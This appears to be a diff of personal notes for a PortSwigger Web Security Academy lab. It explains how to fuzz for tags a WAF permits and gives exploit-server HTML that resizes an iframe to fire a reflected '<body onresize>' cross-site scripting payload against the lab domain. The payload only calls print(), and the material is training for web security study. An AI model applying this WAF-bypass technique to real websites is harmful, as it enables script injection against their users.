@@ -1,6 +1,9 @@
 Put on the lab. Change the domain.
 
-1. You have to find which tag thw waf
+1. Use the OWASP PRoxy Fuzzy feature to find which tag the waf  allows you to use at the  search parameter.
+1.1 You can use the tags that portswigger  suggests https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+2. Insert at the exploit server the content
 
 <script>
     function sleep(ms) {
@@ -8,9 +11,9 @@ Put on the lab. Change the domain.
 	}
 	async function run() {
 	  	await sleep(2000);
+		//you have to change the width or height of the  iframe in order to execute the onresize of the body.
 	  	document.getElementById("myiframe").style="width: 10px;";
 	}
         run();
 </script>
-
 <iframe id="myiframe" name="myiframe" src="https://ac761f1d1fc42e67c06b35c8007f00aa.web-security-academy.net/?search=%3Cbody%20onresize=%22print()%22%3E"></iframe>
